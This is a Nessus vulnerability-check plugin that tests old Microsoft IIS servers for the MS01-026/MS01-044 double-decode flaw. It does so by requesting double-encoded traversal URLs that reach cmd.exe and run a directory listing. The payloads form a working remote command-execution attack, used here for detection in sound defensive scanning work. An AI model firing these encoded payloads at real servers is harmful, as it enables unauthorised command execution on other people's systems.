#
# This script was modified Matt Moore (matt@westpoint.ltd.uk)
# from the NASL script to test for the UNICODE directory traversal
# vulnerability, originally written by Renaud Deraison.
#
# Then Renaud took Matt's script and used H D Moore modifications
# to iis_dir_traversal.nasl ;)
#

# Changes by Tenable:
# - Touched up description (11/04/10)

include("compat.inc");

if (description)
{
 script_id(10671);
 script_version("$Revision: 1.58 $");
 script_cvs_date("$Date: 2014/03/31 10:44:06 $");

 script_cve_id("CVE-2001-0333", "CVE-2001-0507");
 script_bugtraq_id(2708, 3193);
 script_osvdb_id(556, 5736);
 script_xref(name:"MSFT", value:"MS01-026");
 script_xref(name:"MSFT", value:"MS01-044");

 script_name(english:"MS01-026 / MS01-044: Microsoft IIS Remote Command Execution (uncredentialed check)");
 script_summary(english:"Determines if arbitrary commands can be executed");

 script_set_attribute(attribute:"synopsis", value:"Arbitrary commands can be executed on the remote web server.");
 script_set_attribute(attribute:"description", value:
"When IIS receives a user request to run a script, it renders the
request in a decoded canonical form, and then performs security checks
on the decoded request.  A vulnerability results because a second,
superfluous decoding pass is performed after the initial security checks
are completed.  Thus, a specially crafted request could allow an
attacker to execute arbitrary commands on the IIS Server.");
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms01-026");
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms01-044");
 script_set_attribute(attribute:"solution", value:"Microsoft has released a set of patches for IIS 4.0 and 5.0.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/05/15");
 script_set_attribute(attribute:"patch_publication_date", value:"2001/05/15");
 script_set_attribute(attribute:"plugin_publication_date", value:"2001/05/15");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
 script_end_attributes();


 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2014 Matt Moore / H D Moore");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

banner = get_http_banner(port:port);
if ( "IIS" >!< banner ) exit(0);

if ( banner =~ "Microsoft-IIS/[6-9]" ) exit(0);

if(!get_port_state(port))exit(0);


dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/";		# FP
dir[4] = "/_mem_bin/";		# FP
dir[5] = "/exchange/";		# OWA
dir[6] = "/pbserver/";		# Win2K
dir[7] = "/rpc/";		# Win2K
dir[8] = "/cgi-bin/";
dir[9] = "/";

uni[0] = "%255c";  	dots[0] = "..";
uni[1] = "%%35c";	dots[1] = "..";
uni[2] = "%%35%63";	dots[2] = "..";
uni[3] = "%25%35%63";   dots[3] = "..";
uni[4] = "%252e";	dots[4] = "/.";




function check(req)
{
 local_var	r, pat, pat2;
 r = http_keepalive_send_recv(port:port, data:http_get(item:req, port:port));
 if(r == NULL)
 {
  exit(0);
 }

 pat = "<DIR>";
 pat2 = "Directory of C";

 if((pat >< r) || (pat2 >< r)){
   	security_hole(port:port, extra:
strcat('\n Requesting\n ', build_url(port: port, qs: req), '\n produces :\n\n', r));
	return(1);
 	}
 return(0);
}


cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\+/OG";
for(d=0;dir[d];d=d+1)
{
	for(i=0;uni[i];i=i+1)
	{
		url = string(dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], cmd);
		if(check(req:url))exit(0);
	}
}


# Slight variation- do the same, but don't put dots[i] in front
# of cmd (reported on vuln-dev)

for(d=0;dir[d];d=d+1)
{
	for(i=0;uni[i];i=i+1)
	{
		url = string(dir[d], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], dots[i], uni[i], cmd);
		if(check(req:url))exit(0);
	}
}


